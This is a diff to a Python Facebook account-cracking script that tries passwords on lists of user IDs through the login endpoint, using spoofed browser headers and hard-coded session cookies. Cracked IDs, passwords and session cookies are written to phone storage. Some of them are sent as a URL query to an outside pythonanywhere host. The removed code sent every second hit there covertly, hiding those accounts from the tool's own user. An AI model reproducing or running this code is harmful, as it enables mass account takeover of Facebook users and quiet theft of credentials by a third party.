@@ -1266,7 +1266,7 @@ def x(uid,pwx,tl):
     global oks
     global cps
     global twf
-    global loop
+    global loop 
     global bkas
     sys.stdout.write(f"\r {green}(M3) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
@@ -1275,7 +1275,7 @@ def x(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'display': '',
             'isprivate': '',
@@ -1285,44 +1285,51 @@ def x(uid,pwx,tl):
             'trynum': '1',
             'timezone': '-330',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '054055_JJEj',
-            'lgnjs': '1735479656',
+            'lgnrnd': '092142_r1gr',
+            'lgnjs': '1735924903',
             'email': uid,
-            'prefill_contact_point': uid,
+            'prefill_contact_point': '',
             'prefill_source': 'browser_dropdown',
             'prefill_type': 'password',
             'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
+            'first_prefill_type': 'password',
+            'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
-            'ab_test_data': '//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAA//BAAp',
+            'ab_test_data': '/AAAAAAAAAA/AAAAAAAAA/AAAAAAAAAAAAAAAAAA//MMAAAAAMBFAE',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'ps_n': '1',
+            'sb': '5E1pZyIkrazTl9Lj5yv8FN4P',
             'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'wd': '1440x788',
+            'ps_n': '1',
+            'datr': '45hpZ84LBzmpGwmbE9JN9ZXc',
+            'sfau': 'AYjghEJxuRI2LFjp4tHcOAGZl--Ij58PA0hlWv_JxKAWuK9pe3KXTheWiLngPj6m0-Wtd_-32Jor3VcbDNBGjjsgovkysnO-cW0LSKn55BESNpltGv6eenLaAeXJnpwuh6dfowkK7kGGCTxYuk_XbsdSRkJY_rRAVTp19Rz98gDREbQVuLs6qwT7BgLnHfKt9KNvmhLonvnTI0aG3o21d7F50TUmilcLSIMsbseG3N3T0z0DQMOERsQQwxUOt23BwLpzv9xiPhp9FtMLSJW8bKMfN1YV6-FDCoFORO0GFtM0hTc7d6cip4C6kWtjjarnroo',
+            'wd': '817x773',
             'locale': 'en_GB',
-            'fr': '1rNHx4L9yZvgxejws.AWUXGlOQ06X3KBWkyQ0Qf81HjMs.BnXFu6..AAA.0.0.BncVFm.AWUApnyMBoE',}
+            'fr': '1O4OqLuEHMUk7bnz8.AWVBoibK5aA2qLNLjJf4htaLdFg.BneBwq..AAA.0.0.BneBym.AWVd1ILwy_8',
+            'sfiu': 'AYg97uV8h-dsbJjbjZ_PHuAVP-UtEBzTUArwbOoShUDkkQr5h_Gd3gIAeETj9WT5rYhi0bB6fXcUK1JGCyXXm6SP0TsTT5HTyeyghcZYX6-nd0v2qVQocZBFlbRNTXKHbjSRlwYhycOXVavHkx641AbkLXGjaTLE1qs1BIKEELQfSqSnZ2O-bMEjQPpw44icPkzOZ_1CM0i2Sdao0dTA7D8eqLcXN5liVVivQDVEcINfwjRcZYViPCSxn4hKrwPSU7OzHtdAHgjXo2WsZsmRP35JxBBjESp_yquWAoGabKZojjZtK1NHkw3nwa-5imasI8Q',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
             'origin': 'https://en-gb.facebook.com',
-            'pragma': 'no-cache',
             'priority': 'u=0, i',
-            'referer': 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
-            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'referer': 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.205", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            'viewport-width': '817',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
@@ -1334,20 +1341,16 @@ def x(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
-                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{green}(HAMSTER-LGN){cid}|{pw}")
+                        print(f" {green}COKI : {green}{coki}")
+                        open("/sdcard/HAMSTER-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f"{red}(2F){cid}")
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
